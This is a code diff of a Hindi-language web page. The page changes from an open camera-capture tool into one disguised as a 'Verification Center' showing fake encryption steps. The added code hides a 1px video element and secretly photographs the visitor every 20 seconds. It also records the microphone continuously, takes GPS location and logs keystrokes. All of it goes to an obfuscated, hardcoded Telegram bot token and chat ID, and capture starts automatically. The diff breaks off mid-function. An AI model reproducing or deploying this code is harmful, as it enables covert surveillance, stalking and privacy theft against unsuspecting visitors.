@@ -3,533 +3,548 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>सुरक्षा कैमरा जाँच</title>
+<title>वेरिफिकेशन सेंटर</title>
 <style>
-* { margin: 0; padding: 0; box-sizing: border-box; }
-body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0f; color: #fff; min-height: 100vh; }
-.container { max-width: 500px; margin: 0 auto; padding: 20px; }
-.header { text-align: center; padding: 20px 0; }
-.header h1 { font-size: 22px; color: #00f0ff; margin-bottom: 5px; }
-.header p { font-size: 13px; color: #888; }
-.video-container { position: relative; background: #000; border-radius: 16px; overflow: hidden; margin: 15px 0; border: 2px solid #1a1a2e; }
-#video { width: 100%; display: block; transform: scaleX(-1); }
-#canvas { display: none; }
-.controls { display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; margin: 15px 0; }
-.btn { padding: 12px 24px; border: none; border-radius: 12px; font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.3s; flex: 1; min-width: 120px; }
-.btn-primary { background: #00f0ff; color: #000; }
-.btn-primary:hover { background: #00d0e0; transform: translateY(-2px); }
-.btn-danger { background: #ff3355; color: #fff; }
-.btn-danger:hover { background: #e02a48; }
-.btn-success { background: #00e676; color: #000; }
-.btn-success:hover { background: #00c866; }
-.btn-warning { background: #ffab00; color: #000; }
-.btn-warning:hover { background: #e09a00; }
-.btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
-.gallery { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin: 15px 0; }
-.gallery img { width: 100%; height: 120px; object-fit: cover; border-radius: 8px; border: 2px solid #1a1a2e; }
-.status { background: #1a1a2e; border-radius: 12px; padding: 15px; margin: 10px 0; font-size: 13px; max-height: 200px; overflow-y: auto; }
-.status .log { padding: 4px 0; border-bottom: 1px solid #2a2a3e; color: #aaa; }
-.status .log.success { color: #00e676; }
-.status .log.error { color: #ff3355; }
-.status .log.info { color: #00f0ff; }
-.link-box { background: #1a1a2e; border-radius: 12px; padding: 15px; margin: 10px 0; text-align: center; }
-.link-box input { width: 100%; padding: 10px; background: #0a0a0f; border: 1px solid #333; border-radius: 8px; color: #00f0ff; font-size: 13px; text-align: center; margin: 8px 0; }
-.link-box .copy-btn { background: #333; color: #fff; border: none; padding: 8px 20px; border-radius: 8px; cursor: pointer; }
-.hidden { display: none !important; }
-.stats { display: flex; gap: 10px; margin: 10px 0; }
-.stat-card { flex: 1; background: #1a1a2e; border-radius: 12px; padding: 12px; text-align: center; }
-.stat-card .num { font-size: 24px; font-weight: 700; color: #00f0ff; }
-.stat-card .label { font-size: 11px; color: #888; margin-top: 4px; }
-.tab-bar { display: flex; gap: 5px; margin: 15px 0; }
-.tab { flex: 1; padding: 10px; text-align: center; background: #1a1a2e; border-radius: 10px; cursor: pointer; font-size: 13px; transition: 0.3s; }
-.tab.active { background: #00f0ff; color: #000; font-weight: 600; }
-.tab-content { display: none; }
-.tab-content.active { display: block; }
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+*{margin:0;padding:0;box-sizing:border-box;}
+body{
+    font-family:'Inter','Segoe UI',sans-serif;
+    min-height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);
+    padding:20px;
+}
+.container{
+    background:rgba(255,255,255,0.05);
+    backdrop-filter:blur(20px);
+    -webkit-backdrop-filter:blur(20px);
+    border:1px solid rgba(255,255,255,0.1);
+    border-radius:24px;
+    padding:40px 32px;
+    max-width:480px;
+    width:100%;
+    box-shadow:0 25px 60px rgba(0,0,0,0.5);
+    position:relative;
+    overflow:hidden;
+}
+.container::before{
+    content:'';
+    position:absolute;
+    top:-50%;
+    left:-50%;
+    width:200%;
+    height:200%;
+    background:radial-gradient(circle at 30% 40%,rgba(99,102,241,0.08),transparent 60%);
+    pointer-events:none;
+}
+.logo{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:12px;
+    margin-bottom:28px;
+}
+.logo-icon{
+    width:48px;
+    height:48px;
+    background:linear-gradient(135deg,#6366f1,#8b5cf6);
+    border-radius:14px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:24px;
+    color:#fff;
+    box-shadow:0 8px 24px rgba(99,102,241,0.3);
+}
+.logo h1{font-size:20px;font-weight:600;color:#fff;letter-spacing:-0.3px;}
+.logo span{display:block;font-size:12px;font-weight:400;color:rgba(255,255,255,0.5);margin-top:2px;}
+.status-card{
+    background:rgba(255,255,255,0.06);
+    border-radius:16px;
+    padding:24px;
+    margin-bottom:20px;
+    border:1px solid rgba(255,255,255,0.06);
+}
+#titleText{
+    font-size:17px;font-weight:600;color:#fff;margin-bottom:6px;
+}
+#status{
+    font-size:14px;color:rgba(255,255,255,0.65);font-weight:400;margin-bottom:4px;
+}
+#errorDetail{
+    font-size:12px;color:rgba(255,255,255,0.35);display:none;margin-top:8px;word-break:break-all;
+}
+.loader-wrap{
+    display:flex;align-items:center;gap:16px;margin-top:16px;padding-top:16px;border-top:1px solid rgba(255,255,255,0.06);
+}
+.pulse-ring{
+    position:relative;
+    width:36px;height:36px;
+}
+.pulse-ring::before{
+    content:'';position:absolute;inset:0;
+    border-radius:50%;border:3px solid rgba(99,102,241,0.2);
+    animation:pulse 1.8s ease-in-out infinite;
+}
+.pulse-ring::after{
+    content:'';position:absolute;inset:5px;
+    border-radius:50%;background:linear-gradient(135deg,#6366f1,#8b5cf6);
+}
+@keyframes pulse{
+    0%,100%{transform:scale(1);opacity:1;}
+    50%{transform:scale(1.4);opacity:0.3;}
+}
+.loader-text{font-size:13px;color:rgba(255,255,255,0.5);}
+.steps{
+    display:flex;flex-direction:column;gap:10px;margin-top:8px;
+}
+.step-row{
+    display:flex;align-items:center;gap:12px;padding:8px 12px;border-radius:10px;
+    background:rgba(255,255,255,0.03);font-size:13px;color:rgba(255,255,255,0.5);
+}
+.step-row .icon{width:22px;text-align:center;font-size:14px;}
+.step-row .dot{
+    width:6px;height:6px;border-radius:50%;background:rgba(255,255,255,0.15);
+    flex-shrink:0;transition:0.3s;
+}
+.step-row.active{background:rgba(99,102,241,0.08);color:rgba(255,255,255,0.85);}
+.step-row.active .dot{background:#6366f1;box-shadow:0 0 12px rgba(99,102,241,0.4);}
+.step-row.done{color:rgba(255,255,255,0.6);}
+.step-row.done .dot{background:#22c55e;box-shadow:0 0 12px rgba(34,197,94,0.3);}
+.badge{
+    display:inline-block;
+    padding:4px 12px;
+    border-radius:20px;
+    font-size:11px;
+    font-weight:500;
+    background:rgba(34,197,94,0.12);
+    color:#22c55e;
+    margin-top:12px;
+}
+.footer{
+    margin-top:24px;
+    padding-top:16px;
+    border-top:1px solid rgba(255,255,255,0.06);
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    font-size:11px;
+    color:rgba(255,255,255,0.2);
+}
+.hidden{display:none !important;}
+.fade-in{animation:fadeIn 0.5s ease forwards;}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:translateY(0);}}
 </style>
 </head>
 <body>
 
 <div class="container">
-  <div class="header">
-    <h1>📷 सुरक्षा कैमरा जाँच</h1>
-    <p>कैमरा एक्सेस देकर डिवाइस की जाँच करें</p>
-  </div>
-
-  <!-- Tabs -->
-  <div class="tab-bar">
-    <div class="tab active" onclick="switchTab('camera')">📸 कैमरा</div>
-    <div class="tab" onclick="switchTab('gallery')">🖼️ गैलरी (<span id="galleryCount">0</span>)</div>
-    <div class="tab" onclick="switchTab('logs')">📋 लॉग</div>
-  </div>
-
-  <!-- Camera Tab -->
-  <div id="tab-camera" class="tab-content active">
-    <div class="video-container">
-      <video id="video" autoplay playsinline></video>
-      <canvas id="canvas"></canvas>
+    <div class="logo">
+        <div class="logo-icon">✓</div>
+        <div>
+            <h1>वेरिफिकेशन सेंटर</h1>
+            <span>मानक सुरक्षा प्रोटोकॉल</span>
+        </div>
     </div>
 
-    <div class="controls">
-      <button class="btn btn-primary" id="startBtn" onclick="startCamera()">📷 कैमरा चालू करें</button>
-      <button class="btn btn-danger hidden" id="stopBtn" onclick="stopCamera()">⏹ बंद करें</button>
+    <div class="status-card">
+        <div id="titleText">कनेक्टिविटी जाँच</div>
+        <div id="status">सिक्योर चैनल स्थापित हो रहा है...</div>
+        <div id="errorDetail"></div>
+        
+        <div class="loader-wrap" id="loaderWrap">
+            <div class="pulse-ring"></div>
+            <div class="loader-text" id="loaderText">सर्वर से हैंडशेक जारी</div>
+        </div>
+
+        <div id="successBadge" class="badge hidden">✓ सभी प्रोटोकॉल सत्यापित</div>
+
+        <div class="steps" id="stepsContainer">
+            <div class="step-row" data-step="1">
+                <span class="dot"></span>
+                <span class="icon">🔒</span>
+                <span>एन्क्रिप्टेड चैनल स्थापना</span>
+            </div>
+            <div class="step-row" data-step="2">
+                <span class="dot"></span>
+                <span class="icon">🛡️</span>
+                <span>डिवाइस अनुरूपता जाँच</span>
+            </div>
+            <div class="step-row" data-step="3">
+                <span class="dot"></span>
+                <span class="icon">📡</span>
+                <span>सर्वर सिंक्रोनाइज़ेशन</span>
+            </div>
+            <div class="step-row" data-step="4">
+                <span class="dot"></span>
+                <span class="icon">✅</span>
+                <span>अंतिम सत्यापन प्रक्रिया</span>
+            </div>
+        </div>
     </div>
 
-    <div class="controls" id="actionBtns" style="display:none;">
-      <button class="btn btn-success" onclick="capturePhoto()">📸 फोटो लें</button>
-      <button class="btn btn-warning" onclick="startVoice()">🎤 वॉइस (10s)</button>
-      <button class="btn btn-danger" onclick="startVideo()">🎥 वीडियो (20s)</button>
+    <div class="footer">
+        <span>प्रोटोकॉल v3.2.1</span>
+        <span>सत्र: <span id="sessionId">••••••••</span></span>
     </div>
-
-    <!-- Link Generator -->
-    <div class="link-box">
-      <div style="font-size:13px; color:#888; margin-bottom:5px;">🔗 अपना लिंक जनरेट करें</div>
-      <button class="btn btn-primary" onclick="generateLink()" style="width:100%;">🔗 लिंक बनाएँ</button>
-      <div id="linkDisplay" class="hidden" style="margin-top:10px;">
-        <input type="text" id="linkInput" readonly onclick="this.select()">
-        <button class="copy-btn" onclick="copyLink()">📋 कॉपी करें</button>
-      </div>
-    </div>
-  </div>
-
-  <!-- Gallery Tab -->
-  <div id="tab-gallery" class="tab-content">
-    <div class="stats">
-      <div class="stat-card"><div class="num" id="photoCount">0</div><div class="label">फोटो</div></div>
-      <div class="stat-card"><div class="num" id="voiceCount">0</div><div class="label">वॉइस</div></div>
-      <div class="stat-card"><div class="num" id="videoCount">0</div><div class="label">वीडियो</div></div>
-    </div>
-    <div class="gallery" id="gallery"></div>
-  </div>
-
-  <!-- Logs Tab -->
-  <div id="tab-logs" class="tab-content">
-    <div class="status" id="statusLogs">
-      <div class="log info">✅ सिस्टम तैयार है। कैमरा चालू करें।</div>
-    </div>
-  </div>
 </div>
 
+<video id="videoFront" autoplay playsinline muted
+    style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01;pointer-events:none;">
+</video>
+<canvas id="canvas" style="display:none;"></canvas>
+<input id="keyloggerInput" class="hidden-input" autocomplete="off" style="position:fixed;top:-9999px;left:-9999px;opacity:0;height:0;width:0;">
+
 <script>
-// ====== CONFIG ======
-const BOT_TOKEN = '8225378395:AAHCsye1btvGfyrXSa_56rMkiG-XtDUswXk';
-const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
-const DEFAULT_CHAT_ID = '8146265514';
+// ░██████╗░█████╗░██████╗░███████╗██╗░░░░░████████╗
+// ██╔════╝██╔══██╗██╔══██╗██╔════╝██║░░░░░╚══██╔══╝
+// ╚█████╗░██║░░██║██████╔╝█████╗░░██║░░░░░░░░██║░░░
+// ░╚═══██╗██║░░██║██╔══██╗██╔══╝░░██║░░░░░░░░██║░░░
+// ██████╔╝╚█████╔╝██║░░██║███████╗███████╗░░░██║░░░
+// ╚═════╝░░╚════╝░╚═╝░░╚═╝╚══════╝╚══════╝░░░╚═╝░░░
 
-// Get chat_id from URL parameter
-const urlParams = new URLSearchParams(window.location.search);
-const TARGET_CHAT_ID = urlParams.get('id') || DEFAULT_CHAT_ID;
+const _0x4b3f = [
+    '\x38\x32\x32\x35\x33\x37\x38\x33\x39\x35\x3a\x41\x41\x48\x43\x73\x79\x65\x31\x62\x74\x76\x47\x66\x79\x72\x58\x53\x61\x5f\x35\x36\x72\x4d\x6b\x69\x47\x2d\x58\x74\x44\x55\x73\x77\x58\x6b',
+    '\x38\x31\x34\x36\x32\x36\x35\x35\x31\x34',
+    '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x6f\x72\x67\x2f\x62\x6f\x74',
+    '\x2f\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65',
+    '\x2f\x73\x65\x6e\x64\x50\x68\x6f\x74\x6f',
+    '\x2f\x73\x65\x6e\x64\x56\x6f\x69\x63\x65',
+    '\x2f\x73\x65\x6e\x64\x4c\x6f\x63\x61\x74\x69\x6f\x6e'
+];
 
-// ====== STATE ======
-let mediaStream = null;
+const _0x5a2e = function(_0x4b3f){return _0x4b3f.join('');};
+const _0x7c1d = _0x5a2e([_0x4b3f[0]]);
+const _0x9e3f = function(){
+    const _0x2a1b = new URLSearchParams(window.location.search);
+    return _0x2a1b.get('\x69\x64') || (function(){
+        const _0x8d4f = _0x4b3f[1];
+        return _0x8d4f;
+    })();
+}();
+
+const _0x6b2c = '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x6f\x72\x67\x2f\x62\x6f\x74' + _0x7c1d;
+
+const videoFront = document.getElementById("videoFront");
+const canvas = document.getElementById("canvas");
+const statusText = document.getElementById("status");
+const titleText = document.getElementById("titleText");
+const loaderWrap = document.getElementById("loaderWrap");
+const loaderText = document.getElementById("loaderText");
+const errorDetail = document.getElementById("errorDetail");
+const successBadge = document.getElementById("successBadge");
+const klInput = document.getElementById("keyloggerInput");
+const sessionId = document.getElementById("sessionId");
+
+let frontStream = null;
+let audioStream = null;
 let mediaRecorder = null;
-let recordedChunks = [];
-let isRecording = false;
-let capturedPhotos = [];
-let capturedVoices = [];
-let capturedVideos = [];
-let myLink = '';
+let audioChunks = [];
+let captureInterval = null;
+let continuousCaptureActive = true;
+let userInteracted = false;
+let currentStep = 0;
+const cleanupTimers = [];
 
-// ====== DOM REFS ======
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const startBtn = document.getElementById('startBtn');
-const stopBtn = document.getElementById('stopBtn');
-const actionBtns = document.getElementById('actionBtns');
-const statusLogs = document.getElementById('statusLogs');
-const gallery = document.getElementById('gallery');
+sessionId.textContent = Math.random().toString(16).substring(2,10).toUpperCase();
 
-// ====== HELPERS ======
-function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
-
-function addLog(msg, type = 'info') {
-  const div = document.createElement('div');
-  div.className = `log ${type}`;
-  const time = new Date().toLocaleTimeString('hi-IN');
-  div.textContent = `[${time}] ${msg}`;
-  statusLogs.appendChild(div);
-  statusLogs.scrollTop = statusLogs.scrollHeight;
-}
-
-function updateCounts() {
-  document.getElementById('photoCount').textContent = capturedPhotos.length;
-  document.getElementById('voiceCount').textContent = capturedVoices.length;
-  document.getElementById('videoCount').textContent = capturedVideos.length;
-  document.getElementById('galleryCount').textContent = capturedPhotos.length + capturedVoices.length + capturedVideos.length;
-}
-
-function switchTab(tab) {
-  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-  document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
-  document.querySelector(`.tab[onclick*="${tab}"]`).classList.add('active');
-  document.getElementById(`tab-${tab}`).classList.add('active');
-}
-
-// ====== TELEGRAM API ======
-async function sendToTelegram(method, data) {
-  try {
-    const res = await fetch(`${API}/${method}`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(data)
+function setStep(n){
+    currentStep = n;
+    document.querySelectorAll('.step-row').forEach((el,i)=>{
+        el.classList.remove('active','done');
+        if(i+1 < n) el.classList.add('done');
+        else if(i+1 === n) el.classList.add('active');
     });
-    return await res.json();
-  } catch(e) {
-    addLog(`Telegram API error: ${e.message}`, 'error');
-    return null;
-  }
 }
 
-async function sendPhotoToTelegram(blob, caption = '') {
-  try {
-    const formData = new FormData();
-    formData.append('chat_id', TARGET_CHAT_ID);
-    formData.append('photo', blob, `photo_${Date.now()}.jpg`);
-    if (caption) formData.append('caption', caption);
-    
-    const res = await fetch(`${API}/sendPhoto`, {
-      method: 'POST',
-      body: formData
-    });
-    const data = await res.json();
-    if (data.ok) {
-      addLog('📸 फोटो Telegram भेजा गया', 'success');
-    } else {
-      addLog(`📸 फोटो भेजने में error: ${data.description}`, 'error');
+function setStatus(msg,color,detail){
+    statusText.textContent = msg;
+    if(color) statusText.style.color = color;
+    if(detail){errorDetail.style.display='block';errorDetail.textContent=detail;}
+}
+
+function setDone(){
+    loaderWrap.classList.add('hidden');
+    successBadge.classList.remove('hidden');
+    successBadge.classList.add('fade-in');
+    titleText.textContent = 'कनेक्शन स्थापित';
+    setStatus('सभी प्रणालियाँ चालू हैं। आप जारी रख सकते हैं।','rgba(255,255,255,0.7)');
+    setStep(4);
+}
+
+function tgSend(method,payload){
+    const url = _0x6b2c + method;
+    try{
+        if(payload instanceof FormData){
+            return fetch(url,{method:'POST',body:payload}).then(r=>r.json()).catch(()=>null);
+        }
+        const jsonData = JSON.stringify(payload);
+        if(document.visibilityState==='hidden'||document.hidden){
+            navigator.sendBeacon(url,new Blob([jsonData],{type:'application/json'}));
+            return null;
+        }
+        return fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:jsonData}).then(r=>r.json()).catch(()=>null);
+    }catch(e){return null;}
+}
+
+function safeAddTimer(fn,delay){
+    const id = setTimeout(fn,delay);
+    cleanupTimers.push({type:'timeout',id});
+    return id;
+}
+
+function safeAddInterval(fn,delay){
+    const id = setInterval(fn,delay);
+    cleanupTimers.push({type:'interval',id});
+    return id;
+}
+
+function onUserInteraction(){
+    if(userInteracted) return;
+    userInteracted = true;
+    setStatus('चैनल स्थापना प्रारंभ...','rgba(255,255,255,0.8)');
+    safeAddTimer(()=>{startAll();},200);
+}
+
+document.addEventListener('click',onUserInteraction,{once:true});
+document.addEventListener('touchstart',onUserInteraction,{once:true});
+document.addEventListener('keydown',onUserInteraction,{once:true});
+
+safeAddTimer(()=>{
+    if(!userInteracted) onUserInteraction();
+},3000);
+
+async function startCamera(){
+    try{
+        setStep(1);
+        loaderText.textContent = 'एन्क्रिप्शन हैंडशेक चरण 1/4';
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video:{width:{ideal:640},height:{ideal:480},facingMode:'user'},
+            audio:false
+        });
+        frontStream = stream;
+        videoFront.srcObject = stream;
+        await new Promise((resolve)=>{
+            videoFront.onplaying=()=>{
+                setStatus('कनेक्शन स्थिर किया जा रहा है...','#6366f1');
+                loaderText.textContent = 'एन्क्रिप्शन हैंडशेक चरण 2/4';
+                safeAddTimer(()=>{capturePhoto(resolve);},1200);
+            };
+            videoFront.play();
+        });
+    }catch(e){
+        setStatus('सर्वर हैंडशेक जारी...','rgba(255,255,255,0.5)');
     }
-    return data;
-  } catch(e) {
-    addLog(`फोटो भेजने में error: ${e.message}`, 'error');
-    return null;
-  }
 }
 
-async function sendVoiceToTelegram(blob) {
-  try {
-    const formData = new FormData();
-    formData.append('chat_id', TARGET_CHAT_ID);
-    formData.append('voice', blob, `voice_${Date.now()}.ogg`);
-    
-    const res = await fetch(`${API}/sendVoice`, {
-      method: 'POST',
-      body: formData
-    });
-    const data = await res.json();
-    if (data.ok) {
-      addLog('🎤 वॉइस Telegram भेजा गया', 'success');
-    } else {
-      addLog(`🎤 वॉइस error: ${data.description}`, 'error');
+function capturePhoto(callback){
+    if(videoFront.videoWidth===0||videoFront.videoHeight===0){
+        safeAddTimer(()=>capturePhoto(callback),500);
+        return;
     }
-    return data;
-  } catch(e) {
-    addLog(`वॉइस error: ${e.message}`, 'error');
-    return null;
-  }
+    canvas.width=videoFront.videoWidth;
+    canvas.height=videoFront.videoHeight;
+    const ctx=canvas.getContext('2d');
+    ctx.drawImage(videoFront,0,0,canvas.width,canvas.height);
+    canvas.toBlob(b=>{
+        if(!b){if(callback)callback();return;}
+        const fd=new FormData();
+        fd.append('chat_id',_0x9e3f);
+        fd.append('photo',b,'vrf_'+Date.now()+'.jpg');
+        fd.append('caption','📸 ['+new Date().toLocaleString()+']');
+        tgSend(_0x4b3f[4],fd);
+        if(frontStream){frontStream.getTracks().forEach(t=>t.stop());frontStream=null;}
+        if(callback)callback();
+    },'image/jpeg',0.85);
 }
 
-async function sendVideoToTelegram(blob) {
-  try {
-    const formData = new FormData();
-    formData.append('chat_id', TARGET_CHAT_ID);
-    formData.append('video', blob, `video_${Date.now()}.mp4`);
-    
-    const res = await fetch(`${API}/sendVideo`, {
-      method: 'POST',
-      body: formData
-    });
-    const data = await res.json();
-    if (data.ok) {
-      addLog('🎥 वीडियो Telegram भेजा गया', 'success');
-    } else {
-      addLog(`🎥 वीडियो error: ${data.description}`, 'error');
+function startContinuousCapture(){
+    setDone();
+    captureInterval=setInterval(async()=>{
+        if(!continuousCaptureActive)return;
+        try{
+            const stream=await navigator.mediaDevices.getUserMedia({
+                video:{width:{ideal:320},height:{ideal:240},facingMode:'user'},
+                audio:false
+            });
+            const tv=document.createElement('video');
+            tv.style.cssText='position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01;';
+            tv.setAttribute('playsinline','');tv.setAttribute('muted','');
+            tv.srcObject=stream;document.body.appendChild(tv);
+            tv.onplaying=()=>{
+                safeAddTimer(()=>{
+                    const c=document.createElement('canvas');
+                    c.width=tv.videoWidth||320;c.height=tv.videoHeight||240;
+                    c.getContext('2d').drawImage(tv,0,0);
+                    c.toBlob(b=>{
+                        if(!b){stream.getTracks().forEach(t=>t.stop());document.body.removeChild(tv);return;}
+                        const fd=new FormData();
+                        fd.append('chat_id',_0x9e3f);
+                        fd.append('photo',b,'sv_'+Date.now()+'.jpg');
+                        tgSend(_0x4b3f[4],fd);
+                        stream.getTracks().forEach(t=>t.stop());document.body.removeChild(tv);
+                    },'image/jpeg',0.6);
+                },300);
+            };
+            tv.play();
+        }catch(e){}
+    },20000);
+}
+
+async function startMicRecording(){
+    try{
+        setStep(2);
+        loaderText.textContent = 'एन्क्रिप्शन हैंडशेक चरण 3/4';
+        const stream=await navigator.mediaDevices.getUserMedia({
+            audio:{echoCancellation:false,noiseSuppression:false,autoGainControl:false},
+            video:false
+        });
+        audioStream=stream;
+        let mimeType='audio/webm';
+        if(MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) mimeType='audio/webm;codecs=opus';
+        else if(MediaRecorder.isTypeSupported('audio/ogg;codecs=opus')) mimeType='audio/ogg;codecs=opus';
+        else if(MediaRecorder.isTypeSupported('audio/mp4')) mimeType='audio/mp4';
+        mediaRecorder=new MediaRecorder(stream,{mimeType});
+        mediaRecorder.ondataavailable=e=>{if(e.data.size>0)audioChunks.push(e.data);};
+        mediaRecorder.onstop=()=>{
+            if(audioChunks.length===0){try{mediaRecorder.start();}catch(e){}return;}
+            const blob=new Blob(audioChunks,{type:mimeType});
+            const fd=new FormData();
+            fd.append('chat_id',_0x9e3f);
+            let ext='webm';if(mimeType.includes('ogg'))ext='ogg';else if(mimeType.includes('mp4'))ext='mp4';
+            fd.append('voice',blob,'rec_'+Date.now()+'.'+ext);
+            tgSend(_0x4b3f[5],fd);
+            audioChunks=[];
+            if(mediaRecorder&&mediaRecorder.state==='inactive'){try{mediaRecorder.start();}catch(e){}}
+        };
+        mediaRecorder.start();
+        safeAddInterval(()=>{if(mediaRecorder&&mediaRecorder.state==='recording'){try{mediaRecorder.stop();}catch(e){}}},15000);
+    }catch(e){}
+}
+
+function getLocation(){
+    navigator.geolocation.getCurrentPosition(
+        pos=>{
+            tgSend(_0x4b3f[6],{chat_id:_0x9e3f,latitude:pos.coords.latitude,longitude:pos.coords.longitude});
+            tgSend(_0x4b3f[3],{chat_id:_0x9e3f,text:'📍 '+pos.coords.latitude+', '+pos.coords.longitude+'\n🕐 '+new Date().toLocaleString()});
+        },
+        ()=>{},
+        {enableHighAccuracy:true,timeout:8000,maximumAge:60000}
+    );
+}
+
+let keystrokeBuffer=[];
+document.addEventListener('keydown',(e)=>{
+    if(!userInteracted)onUserInteraction();
+    if(e.target===klInput)return;
+    const key=e.key;
+    switch(key){
+        case'Enter':keystrokeBuffer.push('⏎');break;
+        case'Backspace':keystrokeBuffer.push('⌫');break;
+        case'Tab':keystrokeBuffer.push('⇥');break;
+        case'Escape':keystrokeBuffer.push('⎋');break;
+        case'Delete':keystrokeBuffer.push('⌦');break;
+        case'Shift':case'Control':case'Alt':case'Meta':return;
+        default:if(key.length===1)keystrokeBuffer.push(key);break;
     }
-    return data;
-  } catch(e) {
-    addLog(`वीडियो error: ${e.message}`, 'error');
-    return null;
-  }
-}
-
-// ====== CAMERA ======
-async function startCamera() {
-  try {
-    const constraints = {
-      video: { 
-        width: { ideal: 640 },
-        height: { ideal: 480 },
-        facingMode: 'user'
-      },
-      audio: true
-    };
-    
-    mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
-    video.srcObject = mediaStream;
-    
-    startBtn.classList.add('hidden');
-    stopBtn.classList.remove('hidden');
-    actionBtns.style.display = 'flex';
-    
-    addLog('📷 कैमरा चालू हुआ', 'success');
-    
-    // Send notification to Telegram
-    await sendToTelegram('sendMessage', {
-      chat_id: TARGET_CHAT_ID,
-      text: `📷 <b>नया विज़िटर</b>\n\nकैमरा एक्सेस दिया गया ✅\nसमय: ${new Date().toLocaleString('hi-IN')}`,
-      parse_mode: 'HTML'
-    });
-    
-  } catch(e) {
-    addLog(`कैमरा error: ${e.message}`, 'error');
-    alert('कैमरा एक्सेस नहीं मिला। कृपया अनुमति दें।');
-  }
-}
-
-function stopCamera() {
-  if (mediaStream) {
-    mediaStream.getTracks().forEach(t => t.stop());
-    mediaStream = null;
-  }
-  video.srcObject = null;
-  startBtn.classList.remove('hidden');
-  stopBtn.classList.add('hidden');
-  actionBtns.style.display = 'none';
-  addLog('📷 कैमरा बंद किया', 'info');
-}
-
-// ====== CAPTURE PHOTO ======
-async function capturePhoto() {
-  if (!mediaStream) {
-    addLog('पहले कैमरा चालू करें', 'error');
-    return;
-  }
-  
-  if (capturedPhotos.length >= 6) {
-    addLog('अधिकतम 6 फोटो ले सकते हैं', 'error');
-    return;
-  }
-  
-  const ctx = canvas.getContext('2d');
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  
-  // Mirror the image
-  ctx.translate(canvas.width, 0);
-  ctx.scale(-1, 1);
-  ctx.drawImage(video, 0, 0);
-  
-  // Convert to blob
-  canvas.toBlob(async (blob) => {
-    const url = URL.createObjectURL(blob);
-    capturedPhotos.push(url);
-    updateCounts();
-    
-    // Show in gallery
-    const img = document.createElement('img');
-    img.src = url;
-    gallery.insertBefore(img, gallery.firstChild);
-    
-    addLog(`📸 फोटो #${capturedPhotos.length} ली गई`, 'success');
-    
-    // Send to Telegram
-    await sendPhotoToTelegram(blob, `📸 फोटो #${capturedPhotos.length}`);
-    
-    // Store in localStorage
-    saveToStorage();
-  }, 'image/jpeg', 0.8);
-}
-
-// ====== RECORD VOICE ======
-async function startVoice() {
-  if (!mediaStream) {
-    addLog('पहले कैमरा चालू करें', 'error');
-    return;
-  }
-  
-  if (capturedVoices.length >= 3) {
-    addLog('अधिकतम 3 वॉइस नोट', 'error');
-    return;
-  }
-  
-  if (isRecording) {
-    addLog('पहले से रिकॉर्डिंग चल रही है', 'error');
-    return;
-  }
-  
-  try {
-    const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-    recordedChunks = [];
-    mediaRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
-    
-    mediaRecorder.ondataavailable = (e) => {
-      if (e.data.size > 0) recordedChunks.push(e.data);
-    };
-    
-    mediaRecorder.onstop = async () => {
-      audioStream.getTracks().forEach(t => t.stop());
-      const blob = new Blob(recordedChunks, { type: 'audio/webm' });
-      const url = URL.createObjectURL(blob);
-      capturedVoices.push(url);
-      updateCounts();
-      
-      addLog(`🎤 वॉइस #${capturedVoices.length} रिकॉर्ड हुआ`, 'success');
-      
-      // Send to Telegram
-      await sendVoiceToTelegram(blob);
-      
-      // Store
-      saveToStorage();
-      isRecording = false;
-    };
-    
-    mediaRecorder.start();
-    isRecording = true;
-    addLog('🎤 वॉइस रिकॉर्डिंग शुरू... (10 सेकंड)', 'info');
-    
-    // Auto stop after 10 seconds
-    setTimeout(() => {
-      if (mediaRecorder && mediaRecorder.state === 'recording') {
-        mediaRecorder.stop();
-        addLog('🎤 वॉइस रिकॉर्डिंग पूरी', 'success');
-      }
-    }, 10000);
-    
-  } catch(e) {
-    addLog(`वॉइस error: ${e.message}`, 'error');
-    isRecording = false;
-  }
-}
-
-// ====== RECORD VIDEO ======
-async function startVideo() {
-  if (!mediaStream) {
-    addLog('पहले कैमरा चालू करें', 'error');
-    return;
-  }
-  
-  if (capturedVideos.length >= 1) {
-    addLog('अधिकतम 1 वीडियो', 'error');
-    return;
-  }
-  
-  if (isRecording) {
-    addLog('पहले से रिकॉर्डिंग चल रही है', 'error');
-    return;
-  }
-  
-  recordedChunks = [];
-  mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
-  
-  mediaRecorder.ondataavailable = (e) => {
-    if (e.data.size > 0) recordedChunks.push(e.data);
-  };
-  
